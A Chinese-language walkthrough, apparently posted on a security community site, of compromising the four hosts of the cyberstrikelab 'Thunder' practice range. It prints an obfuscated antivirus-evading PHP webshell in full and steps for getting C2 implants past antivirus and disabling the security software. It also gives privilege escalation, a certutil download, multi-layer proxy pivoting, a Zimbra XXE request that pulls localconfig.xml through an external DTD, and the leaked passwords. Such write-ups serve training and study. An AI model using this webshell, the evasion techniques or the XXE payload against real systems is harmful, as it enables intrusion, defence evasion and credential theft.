# cyberstrikelab—Thunder-先知社区

> **来源**: https://xz.aliyun.com/news/16753  
> **文章ID**: 16753

---

# cyberstrikelab—Thunder

# 入口机

## 信息收集

连上openvpn自动跳转到ThinkPHP页面

​![](images/20250213173258-82fbd73a-e9ed-1.png)​

## 漏洞发现

利用ThinkPHP综合利用工具梭哈

​![](images/20250213173300-841ac81e-e9ed-1.png)​

发现有文件包含、数据库信息泄露、RCE漏洞。

直接可以读取C盘下面的flag.txt文件

## 漏洞利用

root root连上172.20.56.32的数据库，发现数据库里面没有什么东西

​![](images/20250213173302-852e6ded-e9ed-1.png)​

可以直接利用工具Getshell，但是有360全家桶和Defender，得做一下免杀，然后内容不能太多，文件过大也无法上传。

​![](images/20250213173304-866bc7fd-e9ed-1.png)​

使用狐狸工具箱里面的弱鸡webshell免杀工具

​![](images/20250213173305-874f2201-e9ed-1.png)​

​![](images/20250213173306-87ecbf03-e9ed-1.png)​

```
<?php if ($_COOKIE['pNkIfG'] == "z8Igdk2RSHV3UAN") {
    $SlysoQ='str_';
    $QUWRfL=$SlysoQ.'replace';
    $fCsZNz=substr($QUWRfL,6);
    $zWmchr='zxcszxctzxcrzxc_zxcrzxcezxc';
    if ($_GET['VdSXoL'] !== $_GET['UNkHtm'] && @md5($_GET['VdSXoL']) === @md5($_GET['UNkHtm'])){
    $mbdisX = 'str_re';
    $zWmchr=substr_replace('zxc',$mbdisX,$zWmchr);
    }else{die();}
    $fCsZNz=$zWmchr.$fCsZNz;
    $PTEIhv = $fCsZNz("fylVHtYv0WbKr5snJ9NxiSCwMLAhzE6m2uqPQ3O8cXgZIdRjp7", "", "str_fylVHtYv0WbKr5snJ9NxiSCwMLAhzE6m2uqPQ3O8cXgZIdRjp7rfylVHtYv0WbKr5snJ9NxiSCwMLAhzE6m2uqPQ3O8cXgZIdRjp7eplfylVHtYv0WbKr5snJ9NxiSCwMLAhzE6m2uqPQ3O8cXgZIdRjp7acfylVHtYv0WbKr5snJ9NxiSCwMLAhzE6m2uqPQ3O8cXgZIdRjp7efylVHtYv0WbKr5snJ9NxiSCwMLAhzE6m2uqPQ3O8cXgZIdRjp7");
    $aqoDYB = $PTEIhv("I3QmFdY26hBXw54UD1exczguZRatHlqSOLv0CnPA9EGMW87ykK", "", "baI3QmFdY26hBXw54UD1exczguZRatHlqSOLv0CnPA9EGMW87ykKsI3QmFdY26hBXw54UD1exczguZRatHlqSOLv0CnPA9EGMW87ykKe64_I3QmFdY26hBXw54UD1exczguZRatHlqSOLv0CnPA9EGMW87ykKdecoI3QmFdY26hBXw54UD1exczguZRatHlqSOLv0CnPA9EGMW87ykKdI3QmFdY26hBXw54UD1exczguZRatHlqSOLv0CnPA9EGMW87ykKeI3QmFdY26hBXw54UD1exczguZRatHlqSOLv0CnPA9EGMW87ykK");
    $uyHEsY = $aqoDYB($PTEIhv("ncPZ3REJgMI6Uk5CQHodvf28t7BAYSax9Dpbe0rXsGKqVjhwFy", "", "Y3JncPZ3REJgMI6Uk5CQHodvf28t7BAYSax9Dpbe0rXsGKqVjhwFylYXncPZ3REJgMI6Uk5CQHodvf28t7BAYSax9Dpbe0rXsGKqVjhwFyRlXncPZ3REJgMI6Uk5CQHodvf28t7BAYSax9Dpbe0rXsGKqVjhwFy2Z1bncPZ3REJgMI6Uk5CQHodvf28t7BAYSax9Dpbe0rXsGKqVjhwFymncPZ3REJgMI6Uk5CQHodvf28t7BAYSax9Dpbe0rXsGKqVjhwFyN0ancPZ3REJgMI6Uk5CQHodvf28t7BAYSax9Dpbe0rXsGKqVjhwFyWncPZ3REJgMI6Uk5CQHodvf28t7BAYSax9Dpbe0rXsGKqVjhwFy9uncPZ3REJgMI6Uk5CQHodvf28t7BAYSax9Dpbe0rXsGKqVjhwFy"));
    $xmPspC = $aqoDYB($PTEIhv("mW0IaB8ElpT5OY9v61ZbDzicu27sqfXt4GALPQkVrgSUeyCRhF", "", "ZXmW0IaB8ElpT5OY9v61ZbDzicu27sqfXt4GALPQkVrgSUeyCRhFZhbmW0IaB8ElpT5OY9v61ZbDzicu27sqfXt4GALPQkVrgSUeyCRhFCmW0IaB8ElpT5OY9v61ZbDzicu27sqfXt4GALPQkVrgSUeyCRhFgmW0IaB8ElpT5OY9v61ZbDzicu27sqfXt4GALPQkVrgSUeyCRhFkXmW0IaB8ElpT5OY9v61ZbDzicu27sqfXt4GALPQkVrgSUeyCRhF1BPmW0IaB8ElpT5OY9v61ZbDzicu27sqfXt4GALPQkVrgSUeyCRhFU1RbmW0IaB8ElpT5OY9v61ZbDzicu27sqfXt4GALPQkVrgSUeyCRhFJmW0IaB8ElpT5OY9v61ZbDzicu27sqfXt4GALPQkVrgSUeyCRhFwmW0IaB8ElpT5OY9v61ZbDzicu27sqfXt4GALPQkVrgSUeyCRhF=mW0IaB8ElpT5OY9v61ZbDzicu27sqfXt4GALPQkVrgSUeyCRhF=mW0IaB8ElpT5OY9v61ZbDzicu27sqfXt4GALPQkVrgSUeyCRhF"));
    $YDkpLt = $aqoDYB($PTEIhv("FrTHbfNhvpDSVkE7uJtoBq2YgGC31OLlPQisnXZM5cwRxA4Ud9", "", "NkFrTHbfNhvpDSVkE7uJtoBq2YgGC31OLlPQisnXZM5cwRxA4Ud9RFrTHbfNhvpDSVkE7uJtoBq2YgGC31OLlPQisnXZM5cwRxA4Ud96FrTHbfNhvpDSVkE7uJtoBq2YgGC31OLlPQisnXZM5cwRxA4Ud9WXZBFrTHbfNhvpDSVkE7uJtoBq2YgGC31OLlPQisnXZM5cwRxA4Ud9ZFrTHbfNhvpDSVkE7uJtoBq2YgGC31OLlPQisnXZM5cwRxA4Ud9w==FrTHbfNhvpDSVkE7uJtoBq2YgGC31OLlPQisnXZM5cwRxA4Ud9"));
    $ltSqyD = $aqoDYB($PTEIhv("IdveH4ZrQEpSwa5KnMBRYOcWTqJzAGkV6hiP2F9j3bufoX1ygt", "", "JIdveH4ZrQEpSwa5KnMBRYOcWTqJzAGkV6hiP2F9j3bufoX1ygt10IdveH4ZrQEpSwa5KnMBRYOcWTqJzAGkV6hiP2F9j3bufoX1ygtpOIdveH4ZrQEpSwa5KnMBRYOcWTqJzAGkV6hiP2F9j3bufoX1ygtw==IdveH4ZrQEpSwa5KnMBRYOcWTqJzAGkV6hiP2F9j3bufoX1ygt"));
    @$tTkKl = $xmPspC;
    @$$tTkKl = $YDkpLt;
    @$SZcvn=$tTkKl.$$tTkKl;
    @$oBqQO=$SZcvn;
    @$$oBqQO=$ltSqyD;
    @$OdXiD=$oBqQO;
    @$yZVxm=$$oBqQO;
    @$BYhPw = $uyHEsY('$QRDve,$EDgWN','return "$QRDve"."$EDgWN";');
    @$zoJju=$BYhPw($OdXiD,$yZVxm);
    @$hAsPry = $uyHEsY("", $zoJju);
    @$hAsPry();
    } ?>
```

使用蚁剑或者哥斯拉连接

## 权限维持

### Vshell

然后上线Vshell和CS，Vshell不用免杀直接可以上线

设置监听172.16.233.2:9995

​![](images/20250213173308-88b4c38b-e9ed-1.png)​

客户端生成

​![](images/20250213173310-89e04322-e9ed-1.png)​

运行即可上线

​![](images/20250213173311-8aef33a4-e9ed-1.png)​

### CS

CS这里要做一下免杀

设置监听172.16.233.2:1234

​![](images/20250213173314-8c3b58a3-e9ed-1.png)​

生成后门程序

​![](images/20250213173316-8d86e086-e9ed-1.png)​

放到掩日里面生成通用免杀的exe程序

​![](images/20250213173318-8edd3ef4-e9ed-1.png)​

运行即可上线

## 提权

使用潇湘信安的PostExpKit插件里面的BadPotato

​![](images/20250213173320-900ff56a-e9ed-1.png)​

运行之前的后门程序，即可上线system

​![](images/20250213173322-915870ad-e9ed-1.png)​

### 抓取明文密码

​![](images/20250213173324-927e76fd-e9ed-1.png)​

WIN-BCQDCARVJPJ\Administrator::Tp@cslKM

使用谢公子的插件开启RDP服务

​![](images/20250213173326-93c06bd6-e9ed-1.png)​

## Vshell搭建第一层代理

​![](images/20250213173328-94fcda7a-e9ed-1.png)​

使用Proxifier设置远程桌面走socks5代理

​![](images/20250213173330-962d2a06-e9ed-1.png)​

## 远程桌面上线

如果遇到这个问题，本地改一下组策略即可

​![](images/20250213173333-97b0892f-e9ed-1.png)​

上线之后，关闭360的主动防御和晶核，再给Defender干掉。

​![](images/20250213173338-9a988901-e9ed-1.png)​

# 第二台机子

## 信息收集

```
172.20.57.98:139 open
172.20.57.30:139 open
172.20.57.98:135 open
172.20.57.30:135 open
172.20.57.30:80 open
172.20.57.98:445 open
172.20.57.30:445 open
172.20.57.98:3306 open
172.20.57.30:3306 open
172.20.57.98:3389 open
172.20.57.98:5985 open
172.20.57.30:10030 open
172.20.57.98:47001 open
172.20.57.98:49670 open
172.20.57.30:49670 open
172.20.57.98:49669 open
172.20.57.30:49669 open
172.20.57.98:49668 open
172.20.57.30:49668 open
172.20.57.98:49667 open
172.20.57.30:49667 open
172.20.57.98:49666 open
172.20.57.30:49666 open
172.20.57.98:49665 open
172.20.57.30:49665 open
172.20.57.98:49664 open
172.20.57.30:49664 open
[*] WebTitle:http://172.20.57.30       code:200 len:931    title:None
[+] NetInfo:
[*]172.20.57.98
   [->]WIN-J2B9EIUKEN3
   [->]172.20.57.98
   [->]10.0.0.65
[+] NetInfo:
[*]172.20.57.30
   [->]WIN-BCQDCARVJPJ
   [->]172.20.56.32
   [->]172.20.57.30
[*] 172.20.57.98         WORKGROUP\WIN-J2B9EIUKEN3   Windows Server 2016 Standard 14393
[*] WebTitle:http://172.20.57.98:5985  code:404 len:315    title:Not Found
[*] WebTitle:http://172.20.57.98:47001 code:404 len:315    title:Not Found
[+] http://172.20.57.30 poc-yaml-thinkphp5-controller-rce 
```

## 漏洞发现

发现172.20.57.98开了3389和3306，根据提示cslab作为账号密码

使用Tscan爆破即可，发现3306账号root，密码cslab

## 漏洞利用

使用MDUT连接数据库，UDF提权

<https://github.com/SafeGroceryStore/MDUT>

<https://github.com/DeEpinGh0st/MDUT-Extend-Release>

​![](images/20250213173343-9deba843-e9ed-1.png)​

发现是低权限用户，无法读取C盘下的flag文件，想办法上线C2

## 权限维持

用第一台机子作为跳板，上传文件

```
certutil -urlcache -split -f http://172.20.57.30/fscan.exe fscan.exe
```

### Vshell

生成正向客户端

​![](images/20250213173346-9f45aa97-e9ed-1.png)​

然后上传到目标机上执行

​![](images/20250213173347-a0570cda-e9ed-1.png)​

连接即可

​![](images/20250213173350-a1ae9081-e9ed-1.png)​

### CS

CS的马要免杀一下，因为目标机有Defender

#### 转发上线

设置监听

​![](images/20250213173352-a319dc28-e9ed-1.png)​

设置socks4代理

生成后门程序

​![](images/20250213173354-a479d813-e9ed-1.png)​

使用掩日的本地分离进行免杀

​![](images/20250213173356-a59e3770-e9ed-1.png)​

执行即可上线

## 提权

使用潇湘信安的PostExpKit插件里面的BadPotato

​![](images/20250213173320-900ff56a-e9ed-1.png)​

运行之前的后门程序，即可上线system

这里默认开了3389，但是抓不到明文密码，使用谢公子的插件直接创建一个用户

​![](images/20250213173401-a8918db9-e9ed-1.png)​

## Vshell搭建第二层代理

​![](images/20250213173328-94fcda7a-e9ed-1.png)​

使用Proxifier设置远程桌面走socks5代理

​![](images/20250213173330-962d2a06-e9ed-1.png)​

## 远程桌面上线

​![](images/20250213173411-ae3a146e-e9ed-1.png)​

直接给杀软干掉。

# 第三台机子

## 信息收集

```
10.0.0.65:139 open
10.0.0.65:135 open
10.0.0.34:80 open
10.0.0.34:22 open
10.0.0.65:445 open
10.0.0.65:3306 open
10.0.0.65:3389 open
10.0.0.65:5985 open
10.0.0.34:22956 open
10.0.0.65:47001 open
10.0.0.65:49664 open
10.0.0.65:49670 open
10.0.0.65:49669 open
10.0.0.65:49668 open
10.0.0.65:49667 open
10.0.0.65:49666 open
10.0.0.65:49665 open
[+] NetInfo:
[*]10.0.0.65
   [->]WIN-J2B9EIUKEN3
   [->]172.20.57.98
   [->]10.0.0.65
[*] WebTitle:http://10.0.0.34:22956    code:200 len:6869   title:小皮面板
[*] WebTitle:http://10.0.0.65:5985     code:404 len:315    title:Not Found
[*] WebTitle:http://10.0.0.65:47001    code:404 len:315    title:Not Found
```

80端口是Zblog服务，发现是ZBlog1.7.3版本

第二台机子上有数据库

​![](images/20250213173416-b173d5f7-e9ed-1.png)​

直接改md5不行

## 漏洞发现

直接去github找源代码

\zblogphp\zb\_system\function\lib\base\member.php文件记录了，password生成方式

```
 /**
     * 静态方法，获取加盐及二次散列的,用于保存的最终密码
     *
     * @param string $ps   明文密码
     * @param string $guid 用户唯一码
     *
     * @return string
     */
    public static function GetPassWordByGuid($ps, $guid)
    {
        return md5(md5($ps) . $guid);
    }
```

1. **明文密码**：首先，有一个明文密码 `ps`，在你的例子中是 `"123456"`。
2. **用户唯一码（盐）** ：然后，有一个用户唯一码 `guid` 作为“盐”，用于增加密码的安全性。在这个例子中，`guid` 是 `"24d876c8772572cf839674c5a176e41c"`。
3. **第一次MD5散列**：对明文密码进行第一次MD5散列计算。对于 `"123456"`，其MD5散列值为 `"e10adc3949ba59abbe56e057f20f883e"`。
4. **连接盐**：将第一次散列的结果与用户的唯一码（盐）连接起来，形成一个新的字符串。即 `"e10adc3949ba59abbe56e057f20f883e24d876c8772572cf839674c5a176e41c"`。
5. **第二次MD5散列**：对上一步得到的新字符串进行第二次MD5散列计算。最终结果是 `"30492f76a0fbcf3906cce8b4b566d6b6"`，这即是保存到数据库中的加密密码。

​![](images/20250213173418-b26276e3-e9ed-1.png)​

## 漏洞利用

把`30492f76a0fbcf3906cce8b4b566d6b6`替换掉数据库里面的hash即可进入后台

​![](images/20250213173419-b359f8cb-e9ed-1.png)​

看了官方的回复说明后台还是有地方能getshell的

​![](images/20250213173421-b4616a44-e9ed-1.png)​

参考:<https://github.com/fengyijiu520/Z-Blog->​

​![](images/20250213173423-b5b0c69f-e9ed-1.png)​

路径:http:/10.0.0.34/zb\_users/theme/shell/template/shelll.php 密码:pass

这里蚁剑直接走proxifier的两层代理即可

## 提权

然后发现有www用户可以sudo执行/home/www/write.sh文件

​![](images/20250213173425-b7076ebe-e9ed-1.png)​

直接利用他改root密码，ssh连接

```
echo root:password|chpasswd
```

## Stowaway搭建第三层代理

这里不知道怎么上线vshell走三层代理，所以使用Venom或者Stowaway搭三层代理

命令也很简单

### 第一层

攻击机

```
windows_admin.exe -l 172.16.233.2:9000 -s 123
```

目标机

```
windows_x64_agent.exe -c 172.16.233.2:9000 -s 123 --reconnect 8
```

### 第二层

攻击机

```
(node 0) >> listen
[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you're controlling was started in the corresponding way!
[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!
[*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1
[*] Please input the [ip:]<port> : 9000
```

目标机

```
windows_agent.exe -c 172.20.57.30:9000 -s 123 --reconnect 8
```

### 第三层

攻击机

```
(node 0) >> listen
[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you're controlling was started in the corresponding way!
[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!
[*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1
[*] Please input the [ip:]<port> : 9000
```

目标机

```
./linux_x64_agent -c 10.0.0.65:9000 -s 123 --reconnect 8
```

然后挨个进去socks设置代理

​![](images/20250213173427-b7ead1fd-e9ed-1.png)​

# 第四台机子

## 信息收集

```
10.1.1.56:11211 open
10.1.1.56:443 open
10.1.1.78:80 open
10.1.1.78:22 open
10.1.1.56:22 open
10.1.1.56:7071 open
10.1.1.56:8443 open
[*] WebTitle http://10.1.1.78          code:200 len:7124   title:Good Luck To You! - cyberstrikelab
[+] Memcached 10.1.1.56:11211 unauthorized
```

## 漏洞发现

10.1.1.56:8443是zimbra

​![](images/20250213173429-b8f3e9dd-e9ed-1.png)​

搜索了一下Nday发现

```
简介：
Zimbra 是一家提供专业的电子邮件软件开发供应商，主要提供 Zimbra Collaboration Server 协作服务器套件、Zimbra Desktop 邮件管理软件等邮件方面的软件。
当 Zimbra 存在像任意文件读取、XXE（XML 外部实体注入） 这种漏洞时，攻击者可以利用此漏洞读取 localconfig.xml 配置文件，获取到 zimbra admin ldap password，并通过 7071 admin 端口进行 SOAP AuthRequest 认证，得到 admin authtoken，然后就可以利用 admin authtoken 进行任意文件上传，从而达到远程代码执行的危害。

影响范围：
Zimbra < 8.7.1 攻击者可以在无需登录的情况下，实现getshell
Zimbra<8.8.11 在服务端使用Memcached做缓存的情况下，经过登录认证后的攻击者可以实现远程代码执行
```

## 漏洞利用

打的时候遇到点问题，走浏览器的SwitchyOmega可以正常访问，但是走proxychain或者proxifier就不行

​![](images/20250213173431-ba44a298-e9ed-1.png)​

​![](images/20250213173434-bc16f041-e9ed-1.png)​

我一开始怀疑防火墙和出入站规则，但是全放开也没用，后面想到两个解决方案

### 方法一

浏览器可以正常访问，burpsuite抓包打即可。

[zimbra攻防笔记-XXE+SSRF RCE – NooEmotionの摆烂屋](http://nooemotion.com/2023/02/16/zimbra%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0-xxessrf-rce/#%E8%87%AA%E5%8A%A8%E5%8C%96RCE%E8%84%9A%E6%9C%AC)

### 方法二

修改第三台机子的root密码，可以利用SSH做正向代理，就是攻击机通过一台可以SSH访问的机子(第三台机子)访问Zimbra服务。

<https://mp.weixin.qq.com/s/TodlZ4cS2PwCU--pM49gEA>

```
proxychain ssh -L 8889:10.1.1.56:8443 root@10.0.0.34
```

也就是访问127.0.0.1:8889相当于访问10.1.1.56:8443

然后在第三台机子/xp/www目录下放1.dtd文件

```
<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

bp抓包

```
POST /Autodiscover/Autodiscover.xml HTTP/1.1
Host: 127.0.0.1:8889
Cookie: ZM_TEST=true
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 398


<!DOCTYPE Autodiscover [
        <!ENTITY % dtd SYSTEM "http://10.1.1.78/1.dtd">
        %dtd;
        %all;
        ]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
        <EMailAddress>aaaaa</EMailAddress>

        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>

    </Request>

</Autodiscover>

```

直接读取密码

```
HTTP/1.1 503 Requested response schema not available <localconfig>?  <key name="ssl_default_digest">?    <value>sha256</value>?  </key>?  <key name="mailboxd_java_heap_size">?    <value>256</value>?  </key>?  <key name="ssl_allow_mismatched_certs">?    <value>true</value>?  </key>?  <key name="snmp_notify">?    <value>yes</value>?  </key>?  <key name="zimbra_java_home">?    <value>/opt/zimbra/java</value>?  </key>?  <key name="ldap_port">?    <value>389</value>?  </key>?  <key name="mailboxd_keystore">?    <value>/opt/zimbra/mailboxd/etc/keystore</value>?  </key>?  <key name="mailboxd_keystore_password">?    <value>Oj1YctFK</value>?  </key>?  <key name="mailboxd_truststore">?    <value>/opt/zimbra/java/jre/lib/security/cacerts</value>?  </key>?  <key name="av_notify_user">?    <value>admin@mail.cslab.com</value>?  </key>?  <key name="mailboxd_directory">?    <value>/opt/zimbra/mailboxd</value>?  </key>?  <key name="av_notify_domain">?    <value>mail.cslab.com</value>?  </key>?  <key name="zimbra_require_interprocess_secur
Date: Sun, 02 Feb 2025 15:45:30 GMT
Content-Type: text/html; charset=ISO-8859-1
Cache-Control: must-revalidate,no-cache,no-store
Content-Length: 11967
Connection: close

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<title>Error 503 Requested response schema not available &lt;localconfig&gt;
  &lt;key name="ssl_default_digest"&gt;
    &lt;value&gt;sha256&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_java_heap_size"&gt;
    &lt;value&gt;256&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ssl_allow_mismatched_certs"&gt;
    &lt;value&gt;true&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="snmp_notify"&gt;
    &lt;value&gt;yes&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_java_home"&gt;
    &lt;value&gt;/opt/zimbra/java&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_port"&gt;
    &lt;value&gt;389&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_keystore"&gt;
    &lt;value&gt;/opt/zimbra/mailboxd/etc/keystore&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_keystore_password"&gt;
    &lt;value&gt;Oj1YctFK&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_truststore"&gt;
    &lt;value&gt;/opt/zimbra/java/jre/lib/security/cacerts&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="av_notify_user"&gt;
    &lt;value&gt;admin@mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_directory"&gt;
    &lt;value&gt;/opt/zimbra/mailboxd&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="av_notify_domain"&gt;
    &lt;value&gt;mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_require_interprocess_security"&gt;
    &lt;value&gt;1&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_gid"&gt;
    &lt;value&gt;995&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_amavis_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_url"&gt;
    &lt;value&gt;ldap://mail.cslab.com:389&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_starttls_supported"&gt;
    &lt;value&gt;1&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="smtp_source"&gt;
    &lt;value&gt;admin@mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ssl_allow_untrusted_certs"&gt;
    &lt;value&gt;false&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_user"&gt;
    &lt;value&gt;zimbra&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_replication_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="postfix_setgid_group"&gt;
    &lt;value&gt;postdrop&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_mysql_password"&gt;
    &lt;value&gt;i.OURb7v4t.oE_ttiws_9dcYz2&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="smtp_notify"&gt;
    &lt;value&gt;yes&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_postfix_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mysql_root_password"&gt;
    &lt;value&gt;P4YtmUFaty8FlD3a7DrqiEXdURMwVZf0&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_server"&gt;
    &lt;value&gt;jetty&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_bes_searcher_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_mysql_connector_maxActive"&gt;
    &lt;value&gt;100&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_nginx_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_master_url"&gt;
    &lt;value&gt;ldap://mail.cslab.com:389&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_ldap_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="snmp_trap_host"&gt;
    &lt;value&gt;mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_zmjava_options"&gt;
    &lt;value&gt;-Xmx256m -Dhttps.protocols=TLSv1,TLSv1.1,TLSv1.2 -Djdk.tls.client.protocols=TLSv1,TLSv1.1,TLSv1.2 -Djava.net.preferIPv4Stack=true&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_accesslog_maxsize"&gt;
    &lt;value&gt;18238930944&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="smtp_destination"&gt;
    &lt;value&gt;admin@mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_mail_service_port"&gt;
    &lt;value&gt;8080&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mysql_bind_address"&gt;
    &lt;value&gt;127.0.0.1&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_truststore_password"&gt;
    &lt;value&gt;changeit&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_host"&gt;
    &lt;value&gt;mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zmtrainsa_cleanup_host"&gt;
    &lt;value&gt;true&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="antispam_mysql_host"&gt;
    &lt;value&gt;127.0.0.1&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_zmprov_default_to_ldap"&gt;
    &lt;value&gt;false&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_uid"&gt;
    &lt;value&gt;997&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_java_options"&gt;
    &lt;value&gt;-server -Dhttps.protocols=TLSv1,TLSv1.1,TLSv1.2 -Djdk.tls.client.protocols=TLSv1,TLSv1.1,TLSv1.2 -Djava.awt.headless=true -Dsun.net.inetaddr.ttl=${networkaddress_cache_ttl} -Dorg.apache.jasper.compiler.disablejsr199=true -XX:+UseConcMarkSweepGC -XX:PermSize=128m -XX:MaxPermSize=350m -XX:SoftRefLRUPolicyMSPerMB=1 -verbose:gc -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCApplicationStoppedTime -XX:-OmitStackTraceInFastThrow -Xloggc:/opt/zimbra/log/gc.log -XX:-UseGCLogFileRotation -XX:NumberOfGCLogFiles=20 -XX:GCLogFileSize=4096K -Djava.net.preferIPv4Stack=true&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_is_master"&gt;
    &lt;value&gt;true&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_server_hostname"&gt;
    &lt;value&gt;mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_root_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="postfix_mail_owner"&gt;
    &lt;value&gt;postfix&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_ldap_userdn"&gt;
    &lt;value&gt;uid=zimbra,cn=admins,cn=zimbra&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_db_maxsize"&gt;
    &lt;value&gt;18238930944&lt;/value&gt;
  &lt;/key&gt;
&lt;/localconfig&gt;
</title>

</head>

<body><h2>HTTP ERROR 503</h2>

<p>Problem accessing /service/autodiscover/Autodiscover.xml. Reason:
<pre>    Requested response schema not available &lt;localconfig&gt;
  &lt;key name="ssl_default_digest"&gt;
    &lt;value&gt;sha256&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_java_heap_size"&gt;
    &lt;value&gt;256&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ssl_allow_mismatched_certs"&gt;
    &lt;value&gt;true&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="snmp_notify"&gt;
    &lt;value&gt;yes&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_java_home"&gt;
    &lt;value&gt;/opt/zimbra/java&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_port"&gt;
    &lt;value&gt;389&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_keystore"&gt;
    &lt;value&gt;/opt/zimbra/mailboxd/etc/keystore&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_keystore_password"&gt;
    &lt;value&gt;Oj1YctFK&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_truststore"&gt;
    &lt;value&gt;/opt/zimbra/java/jre/lib/security/cacerts&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="av_notify_user"&gt;
    &lt;value&gt;admin@mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_directory"&gt;
    &lt;value&gt;/opt/zimbra/mailboxd&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="av_notify_domain"&gt;
    &lt;value&gt;mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_require_interprocess_security"&gt;
    &lt;value&gt;1&lt;/value&gt;
  &lt;/key&gt;
